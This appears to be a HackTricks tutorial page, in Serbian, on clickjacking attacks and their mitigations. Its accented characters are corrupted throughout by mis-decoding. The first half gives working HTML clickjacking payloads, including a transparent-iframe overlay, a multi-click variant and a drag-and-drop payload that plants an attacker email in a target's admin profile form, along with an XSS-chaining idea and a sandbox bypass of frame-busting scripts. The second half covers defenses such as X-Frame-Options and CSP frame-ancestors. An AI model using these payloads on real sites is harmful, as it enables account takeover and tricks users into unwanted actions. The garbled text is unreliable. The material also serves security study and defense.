# Clickjacking

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJEM**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

## 맚a je Clickjacking

U clickjacking napadu, **korisnik** je **prevaren** da **klikne** na **element** na veb stranici koji je ili **nevidljiv** ili prikazan kao drugi element. Ova manipulacija mo쬰 dovesti do ne쬰ljenih posledica za korisnika, kao 코to su preuzimanje malvera, preusmeravanje na zlonamerne veb stranice, pru쬬nje pristupa캜nih podataka ili osetljivih informacija, transfer novca ili online kupovina proizvoda.

### Trik za popunjavanje formi

Ponekad je mogu캖e **popuniti vrednost polja forme kori코캖enjem GET parametara prilikom u캜itavanja stranice**. Napada캜 mo쬰 zloupotrebiti ovu funkcionalnost da popuni formu proizvoljnim podacima i po코alje clickjacking payload tako da korisnik pritisne dugme za slanje.

### Popunjavanje forme sa Drag\&Drop

Ako trebate da korisnik **popuni formu** ali ne 쬰lite direktno da ga zamolite da unese odre캠ene informacije (kao 코to su email ili odre캠ena lozinka koju znate), mo쬰te ga jednostavno zamoliti da **prevu캜e i ispusti** ne코to 코to 캖e upisati va코e kontrolisane podatke kao u [**ovom primeru**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Osnovni Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Vi코ekorak Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Povuci\&Pusti + Klikni payload
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Ako ste identifikovali **XSS napad koji zahteva od korisnika da klikne** na neki element kako bi **pokrenuo** XSS, a stranica je **ranjiva na clickjacking**, mo쬰te je zloupotrebiti da prevarite korisnika da klikne na dugme/link.  
Primer:  
_Prona코li ste **self XSS** u nekim privatnim detaljima naloga (detalji koje **samo vi mo쬰te postaviti i pro캜itati**). Stranica sa **formom** za postavljanje ovih detalja je **ranjiva** na **Clickjacking** i mo쬰te **unapred popuniti** **formu** sa GET parametrima._  
\_\_Napada캜 bi mogao pripremiti **Clickjacking** napad na tu stranicu **unapred popunjavaju캖i** **formu** sa **XSS payloadom** i **prevariti** **korisnika** da **po코alje** formu. Dakle, **kada se forma po코alje** i vrednosti se izmene, **korisnik 캖e izvr코iti XSS**.

## Strategije za ubla쬬vanje Clickjackinga

### Odbrane na strani klijenta

Skripte izvr코ene na strani klijenta mogu izvr코iti radnje kako bi spre캜ile Clickjacking:

* Osiguravanje da je prozor aplikacije glavni ili vrhunski prozor.
* 캛ine캖i sve okvire vidljivim.
* Sprje캜avanje klikova na nevidljive okvire.
* Otkrivanje i obave코tavanje korisnika o potencijalnim poku코ajima Clickjackinga.

Me캠utim, ove skripte za prekid okvira mogu biti zaobi캠ene:

* **Postavke bezbednosti pregleda캜a:** Neki pregleda캜i mogu blokirati ove skripte na osnovu svojih postavki bezbednosti ili nedostatka podr코ke za JavaScript.
* **HTML5 iframe `sandbox` atribut:** Napada캜 mo쬰 neutralisati skripte za prekid okvira postavljanjem atributa `sandbox` sa vrednostima `allow-forms` ili `allow-scripts` bez `allow-top-navigation`. Ovo spre캜ava iframe da proveri da li je vrhunski prozor, npr.,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
### Server-Side Odbrane

#### X-Frame-Options

**`X-Frame-Options` HTTP odgovor zaglavlje** obave코tava pretra쬴va캜e o legitimnosti prikazivanja stranice u `<frame>` ili `<iframe>`, poma쬿캖i u spre캜avanju Clickjacking-a:

* `X-Frame-Options: deny` - Nijedna domena ne mo쬰 postaviti sadr쬬j u okvir.
* `X-Frame-Options: sameorigin` - Samo trenutni sajt mo쬰 postaviti sadr쬬j u okvir.
* `X-Frame-Options: allow-from https://trusted.com` - Samo odre캠eni 'uri' mo쬰 postaviti okvir stranice.
* Imajte na umu ograni캜enja: ako pretra쬴va캜 ne podr쬬va ovu direktivu, mo쬯a ne캖e raditi. Neki pretra쬴va캜i vi코e vole CSP frame-ancestors direktivu.

#### Content Security Policy (CSP) frame-ancestors direktiva

**`frame-ancestors` direktiva u CSP** je preporu캜eni metod za za코titu od Clickjacking-a:

* `frame-ancestors 'none'` - Sli캜no kao `X-Frame-Options: deny`.
* `frame-ancestors 'self'` - Sli캜no kao `X-Frame-Options: sameorigin`.
* `frame-ancestors trusted.com` - Sli캜no kao `X-Frame-Options: allow-from`.

Na primer, slede캖i CSP dozvoljava postavljanje okvira samo sa iste domene:

`Content-Security-Policy: frame-ancestors 'self';`

Detaljnije informacije i kompleksni primeri mogu se prona캖i u [dokumentaciji CSP frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) i [Mozilla-inoj dokumentaciji CSP frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) sa `child-src` i `frame-src`

**Content Security Policy (CSP)** je sigurnosna mera koja poma쬰 u spre캜avanju Clickjacking-a i drugih napada ubacivanjem koda specificiranjem izvora koje pretra쬴va캜 treba da dozvoli za u캜itavanje sadr쬬ja.

#### `frame-src` Direktiva

* Defini코e validne izvore za okvire.
* Konkretnija od `default-src` direktive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ova politika dozvoljava okvire sa istog porekla (self) i https://trusted-website.com.

#### Direktiva `child-src`

* Uvedena u CSP nivou 2 kako bi se postavili validni izvori za web radnike i okvire.
* Deluje kao zamenska opcija za frame-src i worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ova politika omogu캖ava okvire i radnike sa istog porekla (self) i https://trusted-website.com.

**Bele코ke o kori코캖enju:**

* Zastarevanje: child-src se postepeno ukida u korist frame-src i worker-src.
* Pona코anje zamene: Ako frame-src nedostaje, child-src se koristi kao zamena za okvire. Ako oba nedostaju, koristi se default-src.
* Stroga definicija izvora: Uklju캜ite samo pouzdane izvore u direktive kako biste spre캜ili zloupotrebu.

#### JavaScript skripte za prekid okvira

Iako nije potpuno neprobojno, JavaScript-om zasnovane skripte za prekid okvira mogu se koristiti kako bi se spre캜ilo da se web stranica uokviri. Primer:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Kori코캖enje Anti-CSRF Tokena

* **Provera Tokena:** Koristite anti-CSRF tokene u veb aplikacijama kako biste osigurali da zahtevi koji menjaju stanje budu namerno napravljeni od strane korisnika, a ne kroz Clickjacked stranicu.

## Reference

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
